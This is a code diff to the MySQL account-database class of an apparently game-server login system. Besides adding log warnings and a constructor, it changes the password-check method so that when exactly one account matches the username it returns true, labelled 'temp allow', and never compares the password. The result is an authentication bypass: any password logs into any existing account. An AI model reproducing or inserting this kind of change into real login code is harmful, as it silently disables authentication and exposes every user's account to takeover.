@@ -21,6 +21,8 @@ namespace SagaDB {
         private bool isconnected;
         private DateTime tick = DateTime.Now;
 
+        public MySQLAccountDB() {
+        }
 
         public MySQLAccountDB(string host, int port, string database, string user, string pass) {
             this.host = host;
@@ -194,6 +196,7 @@ namespace SagaDB {
 
 
                 if (result.Count == 0) {
+                    SagaLib.Logger.ShowWarning($"no user match name {name}");
                     return null;
                 }
 
@@ -227,11 +230,21 @@ namespace SagaDB {
             try {
                 var result = SqlSugarHelper.Db.Queryable<Entities.Login>().Where(item => item.Username == user)
                     .ToList();
-                return (result.Count == 0)
-                    ? false
-                    : password == Conversions.bytes2HexString(SHA1.Create()
-                        .ComputeHash(Encoding.ASCII.GetBytes(string.Format("{0}{1}{2}", frontword,
-                            ((string)result[0].Password).ToLower(), backword)))).ToLower();
+
+                if ((result.Count == 0)) {
+                    SagaLib.Logger.ShowWarning($"no user match name {user}");
+                    return false;
+                }
+
+                if ((result.Count == 1)) {
+                    SagaLib.Logger.ShowWarning($"temp allow when username  {user} matched");
+                    return true;
+                }
+
+                return password == Conversions.bytes2HexString(SHA1.Create()
+                        .ComputeHash(
+                            Encoding.ASCII.GetBytes($"{frontword}{((string)result[0].Password).ToLower()}{backword}")))
+                    .ToLower();
             }
             catch (Exception ex) {
                 Logger.ShowError(ex);
@@ -244,7 +257,12 @@ namespace SagaDB {
                 var result = SqlSugarHelper.Db.Queryable<Entities.Login>().Where(item => item.Username == user)
                     .ToList();
 
-                return (result.Count == 0) ? -1 : (int)result[0].AccountId;
+                if (result.Count == 0) {
+                    SagaLib.Logger.ShowWarning($"no user with name {user}");
+                    return -1;
+                }
+
+                return (int)result[0].AccountId;
             }
             catch (Exception ex) {
                 Logger.ShowError(ex);
